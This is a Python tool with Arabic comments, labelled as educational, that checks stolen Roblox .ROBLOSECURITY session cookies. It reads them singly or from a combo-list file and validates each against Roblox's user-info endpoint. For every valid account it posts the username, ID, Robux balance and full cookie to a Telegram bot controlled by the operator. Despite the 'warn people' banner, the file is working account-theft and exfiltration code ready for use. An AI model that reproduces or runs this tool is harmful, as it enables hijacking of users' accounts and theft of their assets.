import requests
import os
import sys
import time

# --- إعدادات الأداة (لأغراض تعليمية) ---
# ضع توكن البوت الخاص بك هنا
TELEGRAM_TOKEN = "YOUR_BOT_TOKEN_HERE"
# ضع آيدي الشات الخاص بك هنا
TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE"

BANNER = """
    ____        _     _             _____ _                _ 
   |  _ \  ___ | |__ | | _____  __ / ____| |              | |
   | |_) / _ \| '_ \| |/ _ \ \/ /| (___ | |_ ___  __ _ _ _| |
   |  _ < (_) | |_) | | (_) >  <  \___ \| __/ _ \/ _` | | | |
   | | \ \___/|_.__/|_|\___/_/\_\ ____) | ||  __/ (_| | |_| |
   |_|  \_\                        |_____/ \__\___|\__,_|\__,_|
                                                               
   [!] Educational Purpose Only - Created to Warn People
   [!] This code demonstrates how Roblox account stealers work.
"""

def send_to_telegram(message):
    """إرسال النتائج إلى تليجرام لبيان كيفية وصول البيانات للمخترق"""
    if TELEGRAM_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("[!] لم يتم ضبط توكن تليجرام، لن يتم إرسال البيانات.")
        return
    
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"[-] خطأ في الإرسال لتليجرام: {e}")

def check_roblox_cookie(cookie):
    """
    هذه هي الوظيفة الأساسية التي كانت مخفية داخل الملف التنفيذي.
    تقوم بفحص الكوكي المسروق وجلب بيانات الحساب.
    """
    print(f"[*] جاري فحص الكوكي: {cookie[:20]}...")
    
    # الرابط الرسمي لبيانات المستخدم في روبلكس
    url = "https://www.roblox.com/mobileapi/userinfo"
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            username = data.get("UserName", "Unknown")
            robux = data.get("RobuxBalance", 0)
            user_id = data.get("UserID", "0")
            
            print(f"[+] تم صيد الحساب بنجاح: {username}")
            print(f"    - رصيد الروبوكس: {robux}")
            
            # تجميع الرسالة التي ستصل للمخترق
            msg = (
                f"<b>🔥 Roblox Hit Found!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>User:</b> {username}\n"
                f"🆔 <b>ID:</b> {user_id}\n"
                f"💰 <b>Robux:</b> {robux}\n"
                f"🍪 <b>Cookie:</b> <code>{cookie}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━"
            )
            send_to_telegram(msg)
            return True
        else:
            print("[-] الكوكي غير صالح أو منتهي الصلاحية.")
            return False
            
    except Exception as e:
        print(f"[!] خطأ أثناء الفحص: {e}")
        return False

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    
    print("1. فحص كوكي واحد (Single Cookie)")
    print("2. فحص قائمة كوكيز من ملف (Combo List)")
    choice = input("\n[?] اختر الخيار: ")
    
    if choice == "1":
        cookie = input("[>] أدخل الكوكي لفحصه: ").strip()
        check_roblox_cookie(cookie)
    elif choice == "2":
        file_path = input("[>] أدخل مسار ملف الكوكيز (مثال: cookies.txt): ").strip()
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                cookies = f.readlines()
            print(f"[*] تم تحميل {len(cookies)} كوكي. جاري البدء...")
            for c in cookies:
                check_roblox_cookie(c.strip())
                time.sleep(1)
        else:
            print("[-] الملف غير موجود.")
    else:
        print("[-] خيار غير صحيح.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] تم إيقاف الأداة.")
        sys.exit()
